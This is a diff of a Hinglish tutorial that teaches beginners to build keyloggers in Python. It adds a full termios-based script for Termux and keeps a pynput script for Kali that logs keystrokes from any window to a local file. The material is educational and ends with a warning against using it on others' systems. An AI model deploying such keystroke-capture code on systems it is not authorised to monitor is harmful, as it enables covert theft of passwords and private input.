@@ -1421,60 +1421,101 @@ operating system ke core mein chhup ke baithta hai — sabse dangerous. detect k
 
 isko samajhna zaroori hai kyunki **yahi foundation hai** — poori duniya ke 90% software keyloggers isi concept pe kaam karte hain.
 
-ek library use hoti hai — `pynput` — jo keyboard events sun sakti hai. chalao isko step by step:
+Termux aur Kali dono ke liye alag approach hai — kyunki dono ka environment alag hai. Step by step chalte hain:
+
+> **🔴 important:** `pynput` library Termux mein kaam nahi karti — woh X server (GUI) maangti hai jo Termux mein nahi hota. Isliye Termux ke liye hum Python ke built-in `termios` + `tty` modules use karenge — koi extra install nahi chahiye.
 
 ---
 
+### 📱 Termux ke liye
+
 **Step 1 — Python install karo**
 
-Termux mein:
 ```bash
 pkg install python
 ```
 
-Kali Linux mein (mostly pehle se hoti hai, phir bhi check karo):
+verify karo:
 ```bash
-sudo apt install python3 python3-pip -y
+python3 --version
 ```
 
-> verify karo — version dikhe matlab install hai:
-> ```bash
-> python3 --version
-> ```
+**Step 2 — script banao**
+
+```bash
+nano keylogger.py
+```
+
+> `nano` nahi hai toh pehle: `pkg install nano`
+
+Yeh code paste karo:
+
+```python
+import sys
+import tty
+import termios
+
+log_file = "keys.txt"
+
+fd = sys.stdin.fileno()
+old_settings = termios.tcgetattr(fd)
+
+print("Keylogger chalu hai... band karne ke liye Ctrl+C dabaao\n")
+
+try:
+    tty.setraw(fd)
+    while True:
+        ch = sys.stdin.read(1)
+        if ord(ch) == 3:          # Ctrl+C = band karo
+            break
+        with open(log_file, "a") as f:
+            if ch in ('\r', '\n'):
+                f.write('[ENTER]')
+            elif ord(ch) == 127:
+                f.write('[BACKSPACE]')
+            elif ord(ch) < 32:
+                f.write(f'[CTRL+{chr(ord(ch)+64)}]')
+            else:
+                f.write(ch)
+finally:
+    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
+    print("\nKeylogger band. keys.txt check karo.")
+```
+
+Save karo: `Ctrl + X` → `Y` → `Enter`
+
+**Step 3 — chalao**
+
+```bash
+python3 keylogger.py
+```
+
+kuch bhi type karo — phir `Ctrl + C` se band karo:
+
+```bash
+cat keys.txt
+```
 
 ---
 
-**Step 2 — pynput library install karo**
+### 💻 Kali Linux ke liye
 
-Termux mein:
-```bash
-pip install pynput
-```
+Kali mein desktop environment hota hai (X server available) — isliye `pynput` seedha kaam karta hai.
 
-Kali Linux mein:
+**Step 1 — Python aur pynput install karo**
+
 ```bash
+sudo apt install python3 python3-pip -y
 pip3 install pynput
 ```
 
----
+**Step 2 — script banao**
 
-**Step 3 — keylogger script likho**
-
-ek naya file banao — naam dete hain `keylogger.py`:
-
-Termux mein:
 ```bash
 nano keylogger.py
 ```
 
-Kali Linux mein:
-```bash
-nano keylogger.py
-```
-
-> `nano` ek simple text editor hai terminal ke andar. Nahi hai toh: Termux → `pkg install nano` | Kali → `sudo apt install nano`
-
-Ab yeh code andar paste karo:
+Yeh code paste karo:
 
 ```python
 from pynput.keyboard import Key, Listener
@@ -1495,30 +1536,32 @@ with Listener(on_press=on_press) as listener:
 
 Save karo: `Ctrl + X` → `Y` → `Enter`
 
-**yeh script kya karti hai — line by line:**
-
-- `from pynput.keyboard import Key, Listener` — keyboard sunne wala library import karo
-- `on_press(key)` — jab bhi koi key dabayi jaaye, yeh function chale
-- `key.char` — jo character type hua woh
-- `open(log_file, "a")` — `keys.txt` file mein append karo — purana data nahi mitega
-- `AttributeError` — special keys (Enter, Shift, Ctrl) ka `char` nahi hota, unhe `[key]` format mein save karo
-- `Listener(on_press=...)` — background mein keyboard ki sunwai shuru
-
----
-
-**Step 4 — script chalao aur test karo**
+**Step 3 — chalao**
 
 ```bash
 python3 keylogger.py
 ```
 
-ab kuch bhi type karo terminal mein — phir `Ctrl + C` se band karo, aur dekho:
+kuch bhi type karo kisi bhi window mein — phir `Ctrl + C` se band karo:
 
 ```bash
 cat keys.txt
 ```
 
-`keys.txt` file mein sab kuch record hoga — bilkul aise hi jaise real keylogger karta hai.
+---
+
+**dono scripts kya karti hain — concept:**
+
+| kaam | Termux script | Kali script |
+|---|---|---|
+| keyboard sunna | `termios` + `tty` (built-in) | `pynput` (library) |
+| key capture | terminal ke andar sirf | poore system mein |
+| special keys | `[ENTER]`, `[BACKSPACE]` format | `[Key.enter]` format |
+| extra install | kuch nahi | `pip3 install pynput` |
+
+- `tty.setraw()` — terminal ko raw mode mein daalta hai — har key press seedha milti hai, Enter ka wait nahi
+- `termios.tcgetattr/tcsetattr` — terminal settings save aur restore karta hai — script band hone ke baad terminal normal rehta hai
+- `open(log_file, "a")` — append mode — purana data safe rehta hai, naya end mein add hota hai
 
 > **⚠️ yeh sirf apne khud ke system pe, samajhne ke liye chalao.** kisi aur ke system pe install karna illegal hai — bina permission ke monitoring crime hai.
 
